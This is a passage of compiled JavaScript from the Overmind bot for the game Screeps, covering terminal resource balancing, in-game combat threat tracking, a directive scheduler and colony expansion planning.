            sendAmount = Math.min(sendAmount, (sender.store[resourceType] || 0) - sendCost - 10, (receiver.storeCapacity - _.sum(receiver.store)));
            if (sendAmount < TERMINAL_MIN_SEND) {
                if (verbose)
                    log.debug(`    Size too small`);
                continue;
            }
            const ret = this.transfer(sender, receiver, resourceType, sendAmount, 'equalize');
            if (verbose)
                log.debug(`Response: ${ret}`);
        }
    }
    equalizeCycle() {
        const equalizeResources = TerminalNetwork_1.settings.equalize.resources;
        if (this.memory.equalizeIndex >= equalizeResources.length) {
            this.memory.equalizeIndex = 0;
        }
        // Equalize current resource type
        const resource = equalizeResources[this.memory.equalizeIndex];
        const terminals = resource == RESOURCE_POWER ? _.filter(this.terminals, t => colonyOf(t).powerSpawn != undefined)
            : this.terminals;
        if (resource) { // resource is undefined if there is nothing to equalize
            this.equalize(resource, terminals);
        }
        // Determine next resource type to equalize; most recent resourceType gets cycled to end
        const resourceEqualizeOrder = equalizeResources.slice(this.memory.equalizeIndex + 1)
            .concat(equalizeResources.slice(0, this.memory.equalizeIndex + 1));
        const allColonies = getAllColonies();
        const nextResourceType = _.find(resourceEqualizeOrder, resource => {
            if (resource == RESOURCE_ENERGY) {
                return true;
            }
            const amounts = _.map(this.terminals, terminal => colonyOf(terminal).assets[resource] || 0);
            const tolerance = TerminalNetwork_1.settings.equalize.tolerance[resource]
                || TerminalNetwork_1.settings.equalize.tolerance.default;
            return _.max(amounts) - _.min(amounts) > tolerance;
        });
        // Set next equalize resource index
        this.memory.equalizeIndex = _.findIndex(equalizeResources, resource => resource == nextResourceType);
    }
    /**
     * Register a terminal to be placed in an exceptional state
     */
    registerTerminalState(terminal, state) {
        this.exceptionTerminals[terminal.ref] = state;
        colonyOf(terminal).terminalState = state;
        _.remove(this.terminals, t => t.id == terminal.id);
    }
    /**
     * Handles exceptional terminal states
     */
    handleTerminalState(terminal, state) {
        for (const resourceType of RESOURCE_IMPORTANCE) {
            const maxSendSize = resourceType == RESOURCE_ENERGY ? TerminalNetwork_1.settings.equalize.maxEnergySendSize
                : TerminalNetwork_1.settings.equalize.maxMineralSendSize;
            const amount = (terminal.store[resourceType] || 0);
            const targetAmount = state.amounts[resourceType] || 0;
            const tolerance = targetAmount == 0 ? TERMINAL_MIN_SEND : state.tolerance;
            // Terminal input state - request resources be sent to this colony
            if (state.type == 'in' || state.type == 'in/out') {
                if (amount < targetAmount - tolerance) {
                    // Request needed resources from most plentiful colony
                    const sender = maxBy(this.readyTerminals, t => t.store[resourceType] || 0);
                    if (sender) {
                        const receiveAmount = minMax(targetAmount - amount, TERMINAL_MIN_SEND, maxSendSize);
                        if ((sender.store[resourceType] || 0) > TERMINAL_MIN_SEND) {
                            this.transfer(sender, terminal, resourceType, receiveAmount, 'exception state in');
                            _.remove(this.readyTerminals, t => t.ref == sender.ref);
                        }
                    }
                }
            }
            // Terminal output state - push resources away from this colony
            if (state.type == 'out' || state.type == 'in/out') {
                if (terminal.cooldown == 0 && amount > targetAmount + tolerance) {
                    const receiver = minBy(this.terminals, t => _.sum(t.store));
                    if (receiver) {
                        let sendAmount;
                        if (resourceType == RESOURCE_ENERGY) {
                            const cost = Game.market.calcTransactionCost(amount, terminal.room.name, receiver.room.name);
                            sendAmount = minMax(amount - targetAmount - cost, TERMINAL_MIN_SEND, maxSendSize);
                        }
                        else {
                            sendAmount = minMax(amount - targetAmount, TERMINAL_MIN_SEND, maxSendSize);
                        }
                        if (receiver.storeCapacity - _.sum(receiver.store) > sendAmount) {
                            this.transfer(terminal, receiver, resourceType, sendAmount, 'exception state out');
                            return;
                        }
                    }
                }
            }
        }
    }
    init() {
        this.assets = this.getAllAssets();
    }
    run() {
        // Handle terminals with special operational states
        for (const terminalID in this.exceptionTerminals) {
            this.handleTerminalState(deref(terminalID), this.exceptionTerminals[terminalID]);
        }
        // Equalize resources
        if (Game.time % TerminalNetwork_1.settings.equalize.frequency == 0) {
            this.equalizeCycle();
        }
        // else if (Game.time % this.settings.equalize.frequency == 20) {
        //  let powerTerminals = _.filter(this.terminals, t => colonyOf(t).powerSpawn != undefined);
        //  this.equalize(RESOURCE_POWER, powerTerminals);
        // }
        else {
            // Get rid of excess resources as needed
            const terminalToSellExcess = this.terminals[Game.time % this.terminals.length];
            if (terminalToSellExcess && terminalToSellExcess.cooldown == 0) {
                this.handleExcess(terminalToSellExcess);
            }
            // Order more energy if needed
            if (Game.market.credits > TraderJoe.settings.market.energyCredits) {
                const averageEnergy = _.sum(this.terminals, terminal => colonyOf(terminal).assets[RESOURCE_ENERGY] || 0)
                    / this.terminals.length;
                if (averageEnergy < TerminalNetwork_1.settings.buyEnergyThreshold) {
                    const poorestTerminal = minBy(this.terminals, terminal => colonyOf(terminal).assets[RESOURCE_ENERGY] || 0);
                    if (poorestTerminal) {
                        const amount = Energetics.settings.terminal.energy.tradeAmount;
                        Overmind.tradeNetwork.maintainBuyOrder(poorestTerminal, RESOURCE_ENERGY, amount, MAX_ENERGY_BUY_ORDERS);
                    }
                }
            }
        }
        // Do notifications
        if (this.notifications.length > 0) {
            log.info(`Terminal network activity: ` + alignedNewline + this.notifications.join(alignedNewline));
        }
    }
};
TerminalNetwork.settings = {
    equalize: {
        frequency: 2 * (TERMINAL_COOLDOWN + 1),
        maxEnergySendSize: 25000,
        maxMineralSendSize: 5000,
        tolerance: {
            [RESOURCE_ENERGY]: 100000,
            [RESOURCE_POWER]: 2000,
            default: 5000
        },
        resources: [
            RESOURCE_ENERGY,
            RESOURCE_POWER,
            RESOURCE_CATALYST,
            RESOURCE_ZYNTHIUM,
            RESOURCE_LEMERGIUM,
            RESOURCE_KEANIUM,
            RESOURCE_UTRIUM,
            RESOURCE_OXYGEN,
            RESOURCE_HYDROGEN,
        ],
    },
    buyEnergyThreshold: 200000,
};
TerminalNetwork = TerminalNetwork_1 = __decorate([
    profile,
    assimilationLocked
], TerminalNetwork);

class DefenseDirective extends Directive {
    constructor(flag) {
        super(flag);
        Overmind.overseer.combatPlanner.directives.push(this);
    }
}

// High-level planning for skirmishing and combats
const THREAT_EXPIRATION = 100;
const THREAT_DECAY_TIMESCALE = 100;
const SIEGE_ANALYSIS_EXPIRATION = 2500;
const defaultCombatPlannerMemory = {
    threats: {},
    profiles: {},
    defenses: {},
    sieges: {},
    skirmishes: {},
};
class CombatPlanner {
    constructor() {
        _.defaults(this.memory, defaultCombatPlannerMemory);
    }
    get memory() {
        return Memory.combatPlanner;
    }
    static computeHitsToSpawn(room) {
        // TODO
        return 0;
    }
    // private getNeededPotentials(): CombatPotentials {
    //  // TODO
    // }
    spawnNeededCreeps() {
    }
    assembleSquads() {
        // Figure out the best thing for each creep to be doing
        const idleCreeps = [];
        for (const creep of this.creeps) {
            if (!creep.overlord) {
                idleCreeps.push(creep);
            }
            else {
                const creepDirective = creep.overlord.directive;
                if (creepDirective && creepDirective instanceof DefenseDirective) {
                    if (this.memory.threats[creepDirective.ref]) {
                    }
                }
            }
        }
    }
    static getThreat(directive) {
        if (directive.room) {
            return {
                directive: directive,
                potentials: CombatIntel.getCombatPotentials(directive.room.hostiles),
                roomName: directive.room.name,
                closestColony: directive.colony.name,
                distances: directive.overlord.spawnGroup.memory.distances,
                lastSeen: {
                    tick: Game.time,
                }
            };
        }
        else {
            return {
                directive: directive,
                potentials: undefined,
                roomName: directive.pos.roomName,
                closestColony: directive.colony.name,
                distances: directive.overlord.spawnGroup.memory.distances,
                lastSeen: {
                    tick: Game.time,
                }
            };
        }
    }
    registerThreat(directive) {
        const threat = CombatPlanner.getThreat(directive);
        if (this.memory.threats[directive.ref]) {
            // If a threat already exists, update it or allow potentials to decay
            if (threat.potentials) { // you have vision
                // If you have new info on threat potentials, update the log in memory
                let attack, rangedAttack, heal;
                const lastPotentials = this.memory.threats[directive.ref].potentials;
                if (lastPotentials) {
                    attack = lastPotentials.attack;
                    rangedAttack = lastPotentials.rangedAttack;
                    heal = lastPotentials.heal;
                }
                else {
                    attack = 0;
                    rangedAttack = 0;
                    heal = 0;
                }
                const decayedAttack = exponentialMovingAverage(threat.potentials.attack, attack, THREAT_DECAY_TIMESCALE);
                const decayedRangedAttack = exponentialMovingAverage(threat.potentials.rangedAttack, rangedAttack, THREAT_DECAY_TIMESCALE);
                const decayedHeal = exponentialMovingAverage(threat.potentials.heal, heal, THREAT_DECAY_TIMESCALE);
                // TODO: adjust decay for creeps known to have moved to next visible room
                // Set new potential to maximum of current or decayed potential
                const potentials = {
                    attack: Math.max(threat.potentials.attack, decayedAttack),
                    rangedAttack: Math.max(threat.potentials.rangedAttack, decayedRangedAttack),
                    heal: Math.max(threat.potentials.heal, decayedHeal),
                };
                // Update the existing threat
                this.memory.threats[directive.ref].potentials = potentials;
                this.memory.threats[directive.ref].lastSeen.tick = Game.time;
            }
            else { // no vision
            }
        }
        else {
            // Register a new threat
            this.memory.threats[directive.ref] = threat;
        }
    }
    static getRoomLayout(room) {
        let isBunker, isExposed, isInnerWall, isEdgeWall = false;
        const exitPositions = Pathing.getExitPositions(room.name);
        const terrain = Game.map.getRoomTerrain(room.name);
        // Room is bunker if >80% of hostile structures are covered by ramparts
        const hostileStructures = room.find(FIND_HOSTILE_STRUCTURES);
        const hostileStructuresInRampart = _.filter(hostileStructures, s => s.pos.lookForStructure(STRUCTURE_RAMPART));
        isBunker = (hostileStructuresInRampart.length / hostileStructures.length >= 0.8);
        // Room is edgewall if every exit tile has wall or barrier at 2 range to left/right/top/bottom
        const walledOffExitTiles = _.filter(exitPositions, pos => {
            let lookPos;
            const x = pos.x;
            const y = pos.y;
            if (x == 0) {
                lookPos = new RoomPosition(x + 2, y, room.name);
            }
            else if (x == 49) {
                lookPos = new RoomPosition(x - 2, y, room.name);
            }
            else if (y == 0) {
                lookPos = new RoomPosition(x, y + 2, room.name);
            }
            else if (y == 49) {
                lookPos = new RoomPosition(x, y - 2, room.name);
            }
            else { // shouldn't ever get here
                lookPos = pos;
            }
            if (terrain.get(lookPos.x, lookPos.y) == TERRAIN_MASK_WALL) {
                return true;
            }
            else {
                const rampart = lookPos.lookForStructure(STRUCTURE_RAMPART);
                const wall = lookPos.lookForStructure(STRUCTURE_WALL);
                return rampart != undefined || wall != undefined;
            }
        });
        if (walledOffExitTiles.length == walledOffExitTiles.length) {
            isEdgeWall = true;
        }
        // Room is inner wall if not bunker or edgewall and there is no path to spawn, otherwise exposed
        if (!isBunker && !isEdgeWall) {
            const entryPoints = _.compact([_.find(exitPositions, pos => pos.x == 0),
                _.find(exitPositions, pos => pos.x == 49),
                _.find(exitPositions, pos => pos.y == 0),
                _.find(exitPositions, pos => pos.y == 49),
            ]);
            const target = (room.spawns[0] || room.towers[0]);
            if (target) {
                const obstacles = _.filter(room.structures, s => !s.isWalkable);
                const isReachable = _.find(entryPoints, pos => Pathing.isReachable(pos, target.pos, obstacles));
                if (isReachable) {
                    isExposed = true;
                }
            }
            if (!isExposed) {
                isInnerWall = true;
            }
        }
        if (isEdgeWall) {
            return 'edgewall';
        }
        else if (isBunker) {
            return 'bunker';
        }
        else if (isExposed) {
            return 'exposed';
        }
        else if (isInnerWall) {
            return 'innerwall';
        }
        else {
            log.warning(`Inconclusive room layout for ${room.print}! Assuming inner wall.`);
            return 'innerwall';
        }
    }
    static getSiegeAnalysis(room) {
        const owner = room.owner;
        const level = room.controller ? room.controller.level : 0;
        const towerDamageSamplePositions = _.map(_.range(20), i => new RoomPosition(_.random(1, 48), _.random(1, 48), room.name));
        const maxTowerDamage = _.max(_.map(towerDamageSamplePositions, pos => CombatIntel.towerDamageAtPos(pos, true)));
        const minBarrierHits = room.barriers.length > 0 ? _.min(_.map(room.barriers, b => b.hits)) : 0;
        const avgBarrierHits = room.barriers.length > 0 ? _.sum(room.barriers, b => b.hits) / room.barriers.length : 0;
        const numWalls = room.walls.length;
        const numRamparts = room.ramparts.length;
        const expiration = getCacheExpiration(SIEGE_ANALYSIS_EXPIRATION);
        const roomLayout = this.getRoomLayout(room);
        return {
            owner,
            level,
            maxTowerDamage,
            minBarrierHits,
            avgBarrierHits,
            numWalls,
            numRamparts,
            roomLayout,
            expiration
        };
    }
    registerSiegeAnalysis(room) {
        if (!this.memory.sieges[room.name]) {
            this.memory.sieges[room.name] = {};
        }
        if (!this.memory.sieges[room.name].analysis || Game.time > this.memory.sieges[room.name].analysis.expiration) {
            this.memory.sieges[room.name].analysis = CombatPlanner.getSiegeAnalysis(room);
        }
    }
    init() {
        // Register new interactions in visible rooms
        for (const roomName in Game.rooms) {
            const room = Game.rooms[roomName];
            // Make new siege analyses for rooms needing it
            if (room.owner && !room.my) {
                this.registerSiegeAnalysis(room);
            }
        }
        for (const directive of this.directives) {
            this.registerThreat(directive);
        }
    }
    run() {
    }
    visuals() {
    }
}

var Overseer_1;
const defaultOverseerMemory = {
    suspendUntil: {},
};
/**
 * The Overseer object acts as a scheduler, running directives and overlords for all colonies each tick. It is also
 * in charge of starting new "processes" (directives) to respond to various situations.
 */
let Overseer = Overseer_1 = class Overseer {
    constructor() {
        this.memory = Mem.wrap(Memory, 'overseer', defaultOverseerMemory);
        this.directives = [];
        this.overlords = [];
        this.overlordsByColony = {};
        this.sorted = false;
        this.notifier = new Notifier();
        this.combatPlanner = new CombatPlanner();
    }
    refresh() {
        this.memory = Mem.wrap(Memory, 'overseer', defaultOverseerMemory);
        this.notifier.clear();
    }
    try(callback, identifier) {
        if (USE_TRY_CATCH) {
            try {
                callback();
            }
            catch (e) {
                if (identifier) {
                    e.name = `Caught unhandled exception at ${'' + callback} (identifier: ${identifier}): \n`
                        + e.name + '\n' + e.stack;
                }
                else {
                    e.name = `Caught unhandled exception at ${'' + callback}: \n` + e.name + '\n' + e.stack;
                }
                Overmind.exceptions.push(e);
            }
        }
        else {
            callback();
        }
    }
    get colonies() {
        return _.values(Overmind.colonies);
    }
    registerDirective(directive) {
        this.directives.push(directive);
    }
    removeDirective(directive) {
        _.remove(this.directives, dir => dir.name == directive.name);
        for (const name in directive.overlords) {
            this.removeOverlord(directive.overlords[name]);
        }
    }
    registerOverlord(overlord) {
        this.overlords.push(overlord);
        if (!this.overlordsByColony[overlord.colony.name]) {
            this.overlordsByColony[overlord.colony.name] = [];
        }
        this.overlordsByColony[overlord.colony.name].push(overlord);
    }
    getOverlordsForColony(colony) {
        return this.overlordsByColony[colony.name];
    }
    removeOverlord(overlord) {
        _.remove(this.overlords, o => o.ref == overlord.ref);
        if (this.overlordsByColony[overlord.colony.name]) {
            _.remove(this.overlordsByColony[overlord.colony.name], o => o.ref == overlord.ref);
        }
    }
    isOverlordSuspended(overlord) {
        if (this.memory.suspendUntil[overlord.ref]) {
            if (Game.time < this.memory.suspendUntil[overlord.ref]) {
                return true;
            }
            else {
                delete this.memory.suspendUntil[overlord.ref];
                return false;
            }
        }
        return false;
    }
    suspendOverlordFor(overlord, ticks) {
        this.memory.suspendUntil[overlord.ref] = Game.time + ticks;
    }
    suspendOverlordUntil(overlord, untilTick) {
        this.memory.suspendUntil[overlord.ref] = untilTick;
    }
    registerLogisticsRequests(colony) {
        // Register logistics requests for all dropped resources and tombstones
        for (const room of colony.rooms) {
            // Pick up all nontrivial dropped resources
            for (const resourceType in room.drops) {
                for (const drop of room.drops[resourceType]) {
                    if (drop.amount > LogisticsNetwork.settings.droppedEnergyThreshold
                        || drop.resourceType != RESOURCE_ENERGY) {
                        colony.logisticsNetwork.requestOutput(drop);
                    }
                }
            }
        }
        // Place a logistics request directive for every tombstone with non-empty store that isn't on a container
        for (const tombstone of colony.tombstones) {
            if (_.sum(tombstone.store) > LogisticsNetwork.settings.droppedEnergyThreshold
                || _.sum(tombstone.store) > tombstone.store.energy) {
                if (colony.bunker && tombstone.pos.isEqualTo(colony.bunker.anchor))
                    continue;
                colony.logisticsNetwork.requestOutput(tombstone, { resourceType: 'all' });
            }
        }
    }
    handleBootstrapping(colony) {
        // Bootstrap directive: in the event of catastrophic room crash, enter emergency spawn mode.
        // Doesn't apply to incubating colonies.
        if (!colony.isIncubating) {
            const noQueen = colony.getCreepsByRole(Roles.queen).length == 0;
            if (noQueen && colony.hatchery && !colony.spawnGroup) {
                const setup = colony.hatchery.overlord.queenSetup;
                const energyToMakeQueen = bodyCost(setup.generateBody(colony.room.energyCapacityAvailable));
                if (colony.room.energyAvailable < energyToMakeQueen || hasJustSpawned()) {
                    const result = DirectiveBootstrap.createIfNotPresent(colony.hatchery.pos, 'pos');
                    if (typeof result == 'string' || result == OK) { // successfully made flag
                        colony.hatchery.settings.suppressSpawning = true;
                    }
                }
            }
        }
    }
    handleOutpostDefense(colony) {
        // Guard directive: defend your outposts and all rooms of colonies that you are incubating
        for (const room of colony.outposts) {
            // Handle player defense
            if (room.dangerousPlayerHostiles.length > 0) {
                DirectiveOutpostDefense.createIfNotPresent(Pathing.findPathablePosition(room.name), 'room');
                return;
            }
            // Handle NPC invasion directives
            if (Cartographer.roomType(room.name) != ROOMTYPE_SOURCEKEEPER) { // SK rooms can fend for themselves
                const defenseFlags = _.filter(room.flags, flag => DirectiveGuard.filter(flag) ||
                    DirectiveOutpostDefense.filter(flag));
                if (room.dangerousHostiles.length > 0 && defenseFlags.length == 0) {
                    DirectiveGuard.create(room.dangerousHostiles[0].pos);
                }
            }
        }
    }
    handleColonyInvasions(colony) {
        // Defend against invasions in owned rooms
        if (colony.room) {
            // See if invasion is big enough to warrant creep defenses
            const effectiveInvaderCount = _.sum(_.map(colony.room.hostiles, invader => invader.boosts.length > 0 ? 2 : 1));
            const needsDefending = effectiveInvaderCount >= 3 || colony.room.dangerousPlayerHostiles.length > 0;
            if (needsDefending) {
                // Place defensive directive after hostiles have been present for a long enough time
                const safetyData = RoomIntel.getSafetyData(colony.room.name);
                const invasionIsPersistent = safetyData.unsafeFor > 20;
                if (invasionIsPersistent) {
                    DirectiveInvasionDefense.createIfNotPresent(colony.controller.pos, 'room');
                }
            }
        }
    }
    handleNukeResponse(colony) {
        // Place nuke response directive if there is a nuke present in colony room
        if (colony.room && colony.level >= DirectiveNukeResponse.requiredRCL) {
            for (const nuke of colony.room.find(FIND_NUKES)) {
                DirectiveNukeResponse.createIfNotPresent(nuke.pos, 'pos');
            }
        }
    }
    computePossibleOutposts(colony, depth = 3) {
        return _.filter(Cartographer.findRoomsInRange(colony.room.name, depth), roomName => {
            if (Cartographer.roomType(roomName) != ROOMTYPE_CONTROLLER) {
                return false;
            }
            const alreadyAnOutpost = _.any(Overmind.cache.outpostFlags, flag => (flag.memory.setPosition || flag.pos).roomName == roomName);
            const alreadyAColony = !!Overmind.colonies[roomName];
            if (alreadyAColony || alreadyAnOutpost) {
                return false;
            }
            const alreadyOwned = RoomIntel.roomOwnedBy(roomName);
            const alreadyReserved = RoomIntel.roomReservedBy(roomName);
            const disregardReservations = !onPublicServer() || MY_USERNAME == MUON;
            if (alreadyOwned || (alreadyReserved && !disregardReservations)) {
                return false;
            }
            const neighboringRooms = _.values(Game.map.describeExits(roomName));
            const isReachableFromColony = _.any(neighboringRooms, r => colony.roomNames.includes(r));
            return isReachableFromColony && Game.map.isRoomAvailable(roomName);
        });
    }
    handleNewOutposts(colony) {
        const numSources = _.sum(colony.roomNames, roomName => Memory.rooms[roomName] && Memory.rooms[roomName]["s" /* SOURCES */]
            ? Memory.rooms[roomName]["s" /* SOURCES */].length
            : 0);
        const numRemotes = numSources - colony.room.sources.length;
        if (numRemotes < Colony.settings.remoteSourcesByLevel[colony.level]) {
            const possibleOutposts = this.computePossibleOutposts(colony);
            const origin = colony.pos;
            const bestOutpost = minBy(possibleOutposts, function (roomName) {
                if (!Memory.rooms[roomName])
                    return false;
                const sourceCoords = Memory.rooms[roomName]["s" /* SOURCES */];
                if (!sourceCoords)
                    return false;
                const sourcePositions = _.map(sourceCoords, src => derefCoords(src.c, roomName));
                const sourceDistances = _.map(sourcePositions, pos => Pathing.distance(origin, pos));
                if (_.any(sourceDistances, dist => dist == undefined || dist > Colony.settings.maxSourceDistance)) {
                    return false;
                }
                return _.sum(sourceDistances) / sourceDistances.length;
            });
            if (bestOutpost) {
                const pos = Pathing.findPathablePosition(bestOutpost);
                log.info(`Colony ${colony.room.print} now remote mining from ${pos.print}`);
                DirectiveOutpost.createIfNotPresent(pos, 'room', { memory: { ["C" /* COLONY */]: colony.name } });
            }
        }
    }
    /* Place new event-driven flags where needed to be instantiated on the next tick */
    placeDirectives(colony) {
        this.handleBootstrapping(colony);
        this.handleOutpostDefense(colony);
        this.handleColonyInvasions(colony);
        this.handleNukeResponse(colony);
        if (getAutonomyLevel() > Autonomy.Manual) {
            if (Game.time % Overseer_1.settings.outpostCheckFrequency == 2 * colony.id) {
                this.handleNewOutposts(colony);
            }
            // Place pioneer directives in case the colony doesn't have a spawn for some reason
            if (Game.time % 25 == 0 && colony.spawns.length == 0 &&
                !DirectiveClearRoom.isPresent(colony.pos, 'room')) {
                // verify that there are no spawns (not just a caching glitch)
                const spawns = Game.rooms[colony.name].find(FIND_MY_SPAWNS);
                if (spawns.length == 0) {
                    const pos = Pathing.findPathablePosition(colony.room.name);
                    DirectiveColonize.createIfNotPresent(pos, 'room');
                }
            }
        }
    }
    // Safe mode condition =============================================================================================
    handleSafeMode(colony) {
        if (colony.stage == ColonyStage.Larva && onPublicServer()) {
            return;
        }
        // Safe mode activates when there are dangerous player hostiles that can reach the spawn
        const criticalStructures = _.compact([...colony.spawns,
            colony.storage,
            colony.terminal]);
        for (const structure of criticalStructures) {
            if (structure.hits < structure.hitsMax &&
                structure.pos.findInRange(colony.room.dangerousPlayerHostiles, 2).length > 0) {
                const ret = colony.controller.activateSafeMode();
                if (ret != OK && !colony.controller.safeMode) {
                    if (colony.terminal) {
                        DirectiveTerminalEvacuateState.createIfNotPresent(colony.terminal.pos, 'room');
                    }
                }
                else {
                    return;
                }
            }
        }
        const firstHostile = _.first(colony.room.dangerousPlayerHostiles);
        if (firstHostile && colony.spawns[0]) {
            const barriers = _.map(colony.room.barriers, barrier => barrier.pos);
            if (Pathing.isReachable(firstHostile.pos, colony.spawns[0].pos, barriers)) {
                const ret = colony.controller.activateSafeMode();
                if (ret != OK && !colony.controller.safeMode) {
                    if (colony.terminal) {
                        DirectiveTerminalEvacuateState.createIfNotPresent(colony.terminal.pos, 'room');
                    }
                }
                else {
                    return;
                }
            }
        }
    }
    // Initialization ==================================================================================================
    init() {
        // Initialize directives
        for (const directive of this.directives) {
            directive.init();
        }
        // Sort overlords by priority if needed (assumes priority does not change after constructor phase
        if (!this.sorted) {
            this.overlords.sort((o1, o2) => o1.priority - o2.priority);
            for (const colName in this.overlordsByColony) {
                this.overlordsByColony[colName].sort((o1, o2) => o1.priority - o2.priority);
            }
            this.sorted = true;
        }
        // Initialize overlords
        for (const overlord of this.overlords) {
            if (!this.isOverlordSuspended(overlord)) {
                overlord.preInit();
                this.try(() => overlord.init());
            }
        }
        // Register cleanup requests to logistics network
        for (const colony of this.colonies) {
            this.registerLogisticsRequests(colony);
        }
    }
    // Operation =======================================================================================================
    run() {
        for (const directive of this.directives) {
            directive.run();
        }
        for (const overlord of this.overlords) {
            if (!this.isOverlordSuspended(overlord)) {
                this.try(() => overlord.run());
            }
        }
        for (const colony of this.colonies) {
            this.handleSafeMode(colony);
            this.placeDirectives(colony);
        }
    }
    getCreepReport(colony) {
        const spoopyBugFix = false;
        const roleOccupancy = {};
        for (const overlord of this.overlordsByColony[colony.name]) {
            for (const role in overlord.creepUsageReport) {
                const report = overlord.creepUsageReport[role];
                if (report == undefined) {
                    if (Game.time % 100 == 0) {
                        log.info(`Role ${role} is not reported by ${overlord.ref}!`);
                    }
                }
                else {
                    if (roleOccupancy[role] == undefined) {
                        roleOccupancy[role] = [0, 0];
                    }
                    roleOccupancy[role][0] += report[0];
                    roleOccupancy[role][1] += report[1];
                    if (spoopyBugFix) { // bizzarely, if you comment these lines out, the creep report is incorrect
                        log.debug(`report: ${JSON.stringify(report)}`);
                        log.debug(`occupancy: ${JSON.stringify(roleOccupancy)}`);
                    }
                }
            }
        }
        // let padLength = _.max(_.map(_.keys(roleOccupancy), str => str.length)) + 2;
        const roledata = [];
        for (const role in roleOccupancy) {
            const [current, needed] = roleOccupancy[role];
            // if (needed > 0) {
            //  stringReport.push('| ' + `${role}:`.padRight(padLength) +
            //                    `${Math.floor(100 * current / needed)}%`.padLeft(4));
            // }
            roledata.push([role, `${current}/${needed}`]);
        }
        return roledata;
    }
    visuals() {
        for (const directive of this.directives) {
            directive.visuals();
        }
        for (const overlord of this.overlords) {
            overlord.visuals();
        }
        this.notifier.visuals();
        // for (let colony of this.colonies) {
        //  this.drawCreepReport(colony);
        // }
    }
};
Overseer.settings = {
    outpostCheckFrequency: onPublicServer() ? 250 : 100
};
Overseer = Overseer_1 = __decorate([
    profile
], Overseer);

const CHECK_EXPANSION_FREQUENCY = 1000;
const UNOWNED_MINERAL_BONUS = 100;
const CATALYST_BONUS = 75;
const MAX_SCORE_BONUS = _.sum([UNOWNED_MINERAL_BONUS, CATALYST_BONUS]);
const TOO_CLOSE_PENALTY = 100;
const defaultExpansionPlannerMemory = {};
let ExpansionPlanner = class ExpansionPlanner {
    constructor() {
        this.memory = Mem.wrap(Memory, 'expansionPlanner', defaultExpansionPlannerMemory);
    }
    refresh() {
        this.memory = Mem.wrap(Memory, 'expansionPlanner', defaultExpansionPlannerMemory);
    }
    handleExpansion() {
        const allColonies = getAllColonies();
        // If you already have max number of colonies, ignore
        if (allColonies.length >= Math.min(Game.gcl.level, MAX_OWNED_ROOMS)) {
            return;
        }
        // If you are on shard3, limit to 3 owned rooms // TODO: use CPU-based limiting metric
        if (Game.shard.name == 'shard3') {
            if (allColonies.length >= SHARD3_MAX_OWNED_ROOMS) {
                return;
            }
        }
        const roomName = this.chooseNextColonyRoom();
        if (roomName) {
            const pos = Pathing.findPathablePosition(roomName);
            DirectiveColonize.createIfNotPresent(pos, 'room');
            log.notify(`Room ${roomName} selected as next colony! Creating colonization directive.`);
        }
    }
    chooseNextColonyRoom() {
        // Generate a list of possible colonies to expand from based on level and whether they are already expanding
        // let possibleIncubators: Colony[] = []; // TODO: support incubation
        const possibleColonizers = [];
        for (const colony of getAllColonies()) {
            // if (colony.level >= DirectiveIncubate.requiredRCL
            //  && _.filter(colony.flags, flag => DirectiveIncubate.filter(flag)).length == 0) {
            //  possibleIncubators.push(colony);
            // }
            if (colony.level >= DirectiveColonize.requiredRCL
                && _.filter(colony.flags, flag => DirectiveColonize.filter(flag)).length == 0) {
                possibleColonizers.push(colony);
            }
        }
        const possibleBestExpansions = _.compact(_.map(possibleColonizers, col => this.getBestExpansionRoomFor(col)));
        log.debug(JSON.stringify(possibleBestExpansions));
        const bestExpansion = maxBy(possibleBestExpansions, choice => choice.score);
        if (bestExpansion) {
            log.alert(`Next expansion chosen: ${bestExpansion.roomName} with score ${bestExpansion.score}`);
            return bestExpansion.roomName;
        }
        else {
            log.alert(`No viable expansion rooms found!`);
        }
    }
    getBestExpansionRoomFor(colony) {
        const allColonyRooms = _.zipObject(_.map(getAllColonies(), col => [col.room.name, true]));
        const allOwnedMinerals = _.map(getAllColonies(), col => col.room.mineral.mineralType);
        let bestRoom = '';
        let bestScore = -Infinity;
        for (const roomName in colony.memory.expansionData.possibleExpansions) {
            let score = colony.memory.expansionData.possibleExpansions[roomName];
            if (typeof score != 'number')
                continue;
            // Compute modified score
            if (score + MAX_SCORE_BONUS > bestScore) {
                // Is the room too close to an existing colony?
                const range2Rooms = Cartographer.findRoomsInRange(roomName, MIN_EXPANSION_DISTANCE);
                if (_.any(range2Rooms, roomName => allColonyRooms[roomName])) {
                    continue; // too close to another colony
                }
                const range3Rooms = Cartographer.findRoomsInRange(roomName, MIN_EXPANSION_DISTANCE + 1);
                if (_.any(range3Rooms, roomName => allColonyRooms[roomName])) {
                    score -= TOO_CLOSE_PENALTY;
                }
                // Are there powerful hostile rooms nearby?
                const adjacentRooms = Cartographer.findRoomsInRange(roomName, 1);
                if (_.any(adjacentRooms, roomName => Memory.rooms[roomName]["a" /* AVOID */])) {
                    continue;
                }
                // Reward new minerals and catalyst rooms
                const mineralType = Memory.rooms[roomName]["m" /* MINERAL */]
                    ? Memory.rooms[roomName]["m" /* MINERAL */]["t" /* MINERALTYPE */]
                    : undefined;
                if (mineralType) {
                    if (!allOwnedMinerals.includes(mineralType)) {
                        score += UNOWNED_MINERAL_BONUS;
                    }
                    if (mineralType == RESOURCE_CATALYST) {
                        score += CATALYST_BONUS;
                    }
                }
                // Update best choices
                if (score > bestScore && Game.map.isRoomAvailable(roomName)) {
                    bestScore = score;
                    bestRoom = roomName;
                }
            }
        }
        if (bestRoom != '') {
            return { roomName: bestRoom, score: bestScore };
        }
    }
    init() {
    }
    run() {
        if (Game.time % CHECK_EXPANSION_FREQUENCY == 17 && getAutonomyLevel() == Autonomy.Automatic) {
            this.handleExpansion();
        }
    }
};
ExpansionPlanner = __decorate([
    assimilationLocked,
    profile
], ExpansionPlanner);

